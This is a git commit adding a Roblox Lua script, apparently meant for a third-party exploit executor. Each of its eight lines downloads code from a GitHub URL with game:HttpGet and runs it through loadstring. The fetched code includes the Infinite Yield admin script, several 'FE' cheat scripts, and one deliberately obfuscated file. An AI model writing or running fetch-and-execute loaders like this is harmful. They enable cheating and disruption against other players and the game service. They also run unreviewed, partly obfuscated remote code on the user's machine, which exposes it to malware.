8339eff16d5913e547cf8489773f0612765a3a93
qplw <153399490+qplw@users.noreply.github.com>
2024-10-05 13:30:20 -0400

    Create script.lua

---
+++ script.lua
@@ -0,0 +1,8 @@
+printidentity()loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
+print("incognito w")loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Gi7331/scripts/main/Emote.lua"))()
+print("incognito w")loadstring(game:HttpGet("https://raw.githubusercontent.com/H20CalibreYT/SystemBroken/main/script"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/0Ben1/fe/main/obf_11l7Y131YqJjZ31QmV5L8pI23V02b3191sEg26E75472Wl78Vi8870jRv5txZyL1.lua.txt"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/likelysmith/EmptyTools/main/script"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/saya420/Mic-Up/main/Flashback-Rewind"))();
+loadstring(game:HttpGet("https://raw.githubusercontent.com/qplw/micupscript1/refs/heads/main/main.lua"))();
+loadstring(game:HttpGet("https://raw.githubusercontent.com/qplw/micupscript2/refs/heads/main/main.lua"))();
